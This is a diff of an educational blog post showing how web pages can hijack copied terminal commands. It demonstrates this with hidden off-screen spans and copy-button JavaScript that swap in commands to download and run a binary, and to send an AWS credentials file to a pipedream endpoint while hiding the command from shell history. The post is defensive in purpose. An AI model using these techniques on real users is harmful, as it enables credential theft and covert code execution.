@@ -4,13 +4,13 @@ emoji: 🗒️
 asset: "/assets/posts/dont-trust-your-clipboard"
 ---
 
-One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.
+One of the best things about the software profession is the culture of knowledge sharing. You can find solutions, manuals, tutorials, and blogs all over the internet with examples, commands, and code snippets.
 
-At first glance, copying and pasting code from the internet appears innocuous and is a daily practice many of us. It's common to copy code from various online sources such as tutorials, Stack Overflow posts, READMEs, gists, blogs, and the like.
+At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources such as tutorials, Stack Overflow posts, READMEs, gists, blogs, and the like.
 
-Just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals, which can lead to much more severe consequences.
+Just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals, which can also lead to severe consequences.
 
-**DISCLAIMER:** This post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution, as there may be risks involved. Later on, we will delve into the reasons why I felt the need to include this disclaimer.
+This post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution, as there may be risks involved. Later on, we will delve into the reasons why I felt the need to include this disclaimer.
 
 One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.
 
@@ -20,22 +20,20 @@ One of my favorite examples of why you should exercise caution when running copy
     <img style="max-width: 75%;" src="{{ page.asset }}/rickroll.gif"/>
 </div>
 
-Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your computer is something that should always make you uneasy. Unfortunately, many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl 0fsSL https://example.com/script.sh). One prominent example of this is Homebrew.`
+Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your system is something that should make you uneasy. Many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl 0fsSL https://example.com/script.sh)`. A prominent example of this is Homebrew.
 
 #### [Install Homebrew - brew.sh](https://brew.sh/)
 <div style="text-align: center;">
     <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
 </div>
 
-Arbitrary code execution is bad because it involves running code on your computer that you may not understand or trust. This can lead to serious security vulnerabilities or other consequences. With the understanding and concern associated with arbitrary code execution, let's examine the different methods of copying text, including copying via button and the traditional select, copy, and paste method.
+Running arbitrary code that you do not understand or trust. Let's examine the different methods of copying text that can lead to code execution, including copying via button and the traditional select, copy, and paste method.
 
 ## Copy Text Via Button
 
-While the pervious example might seem obvious to many. What is less obvious is the copy button which purpose to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples in the last month of where I have encountered the copy text button:
+The copy button purpose is to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples in the last month of where I have encountered the copy text button:
 
 #### [Amazon EC2 key pairs | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html)
-
-https://askubuntu.com/questions/377259/stop-terminal-auto-executing-when-pasting-a-command
 
 <div style="text-align: center;">
     <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws.png">
@@ -50,7 +48,7 @@ Github injects a copy button for all code block in READMEs.
 </div>
 
 
-The examples above are not inherently harmful, but they may lead individuals trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.
+The examples above are not inherently harmful, but they lead individuals trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.
 
 <link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">
 
@@ -82,12 +80,10 @@ function nefariousCopy(n) {
   document.body.removeChild(dummy);
 }
 </script>
-
-Oh `BadActor666` provides the Docker command I am looking for and I can easily copy & paste it into my terminal via the copy button.
-
+<br>
 <div style="text-align: center;">
-<video style="max-width: 80%;"  controls>
-  <source src="{{ page.asset }}/ghostbusters.mp4" type="video/mp4">
+<video style="max-width: 75%;"  controls>
+  <source src="{{ page.asset }}/ghostbusters.webm">
   Your browser does not support HTML video.
 </video>
 </div>
@@ -121,27 +117,25 @@ Using `select()` plus `execCommand()` is the way most copy buttons on webpage wo
 
 ## Select, Copy & Paste
 
-One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets. Simply selecting text, using right click or `ctrl + c` and then pasting should be safe right? 
-
-Lets go back to Look at another post from  totally-safe-and-helpful.blog ...
+Lets go back to Look at another post from  totally-safe-and-helpful.blog.
 
 <div id="totallysafeandhelpful">
 
   <h3>Welcome back to totally-safe-and-helpful.blog</h3>
   <h5>By BadActor666</h5>
 
-  Today we are going to explore how to find the files taking up all your harddisk space using the `du` command.
+  Today we are going to explore how to find the files taking up all your harddisk space using the <b>du</b> command.
 
   <br><br>
   <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io/{{ page.asset }}/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>
   <br>
 </div>
 
-... seems safe enough. Looks like any other code snippet from any of the following websites and blogs. You can see where this is going. All aboard 🚂 !
+Seems safe enough; Looks like any other code snippet on the internet. You can see where this is going. All aboard 🚂 !
 
 <div style="text-align: center;">
-<video style="max-width: 80%;"  controls>
-  <source src="{{ page.asset }}/choochoo.mp4" type="video/mp4">
+<video style="max-width: 75%;"  controls>
+  <source src="{{ page.asset }}/choochoo.webm">
   Your browser does not support HTML video.
 </video>
 </div>
@@ -158,35 +152,26 @@ Lets go back to Look at another post from  totally-safe-and-helpful.blog ...
 </div>
 ```
 
-This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example:
-
-<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
+This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example: Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.
 
 ```
 <p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
 ```
 
 This allows us to add style to text, but browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
+
 ```
 du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
 du -hs * | sort -rh | head -5
 ```
 
-The curl downloads a file, makes it exactable, runs it.
+The curl downloads a file, makes it executable, runs it.
 
-## Composing the Attack
+## Composing the Attacks
 
 ### Attack Avenue 1
 
-Now the real danger is in the `sudo` command. The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  Often sudo is used to install or update packages, i.e. `sudo apt-get install apache2` on.
-
-```
-nick ~
-$ sudo apt-get install apache2
-[sudo] password for nick:
-```
-
-When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.
+The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.
 
 ```
 nick /home $ sudo apt-get install apache2
@@ -199,29 +184,24 @@ Reading package lists... Done
 nick /home $
 ```
 
-Notice how for the second sudo command didn't require a password. Thats because sudo has a setting entitled, `timestamp_timeout` sets the number of minutes that can elapse before sudo will ask for a passwd again. This allow to run multiple sudo command in short pervious of time without needing to re-enter your password over and over again. By default is value is set to 5 minutes. This is where hackers can take advantage. First, have a commands that are legit that require `sudo` access.
+Notice for the second `sudo` command it didn't require a password. The `sudo` command has a `timestamp_timeout` feature that specifies the amount of time that can pass before `sudo` asks for a password again. This allows users to execute multiple privileged commands in a short period without having to repeatedly enter their password. The default value for this feature is 5 minutes.
 
-```
-sudo apt install -yq curl gnupg2 ca-certificates lsb-release
-sudo apt-get -yq update
-sudo apt install -yq nginx
-sudo systemctl start nginx
-```
-
-This could result in malicious or spyware or ransomware being installed on a system.
+Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other malicious actions.
 
 ### Attack Avenue 2
 
-Wh
+AWS credentials are stored in plaintext and is owned by the current user `~/.aws/credentials` It is the same story for your ssh private keys stored in `.ssh`. This means sudo is not required to access these creds. This means anything you run as your used could get access to these secrets. 
 
-#
+To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time. 
+
+For this exercise there is AWS creds for the `james007` is located in `~/.aws/credentials-fake`. And James found the following from totally-safe-and-helpful.blog.
+
+
 <!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->
-
-Your user can access your data your don't need sudo/root.
+<!-- history -d -10--1 -->
+<!-- https://requestbin.com/r/envbrzdr9hp9 -->
 
 <div id="totallysafeandhelpful">
-  <h3>Welcome to totally-safe-and-helpful.blog</h3>
-  <h5>By BadActor666</h5>
   <table>
     <td style="vertical-align: middle; width: 100%">
       <div class="code nocopy">top -d 0.25 -c</div>
@@ -232,7 +212,6 @@ Your user can access your data your don't need sudo/root.
       </div>
       </td>
   </table>
-    <br>
 </div>
 
 <script>
@@ -243,7 +222,7 @@ function nefariousCopy2(n) {
   console.log(clicks)
   if (clicks == 0) {
     document.getElementById("b2").classList.toggle("button2");
-    dummy.textContent = `xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ \n`;
+    dummy.textContent = ` curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; clear; top -d 0.25 -c; clear; \n`;
   } else {
     dummy.textContent = `top -d 0.25 -c \n`;
   }
@@ -254,9 +233,24 @@ function nefariousCopy2(n) {
 }
 </script>
 
-```
-xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ 
-```
+The copy button will copy the following command, but only on the first click. After the first click the real command will be copied.
+
+{: .no-code-wrap}
+$  curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; top -d 0.25 -c; clear;
+
+This is lower the chance of the end user noticing something is a miss. The ony indication that something is off is the terminal being cleared and the malous command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard. 
+
+There are some subtleties to this commands that we should explore. 
+
+Notice the space between the $ prompt and the command itself. This will prevent the command from being saved to your bash history. This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the 
+
+<div style="text-align: center;">
+<video style="max-width: 90%;"  controls>
+  <source src="{{ page.asset }}/steal-aws-creds.webm">
+  Your browser does not support HTML video.
+</video>
+</div>
+
 
 ## Conclusion  
 
@@ -265,4 +259,3 @@ When you use someone else's code or access a website, you are placing trust in t
 Another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repose and other resources be in some type of artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 
 
 Where do we go from here? To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.
-
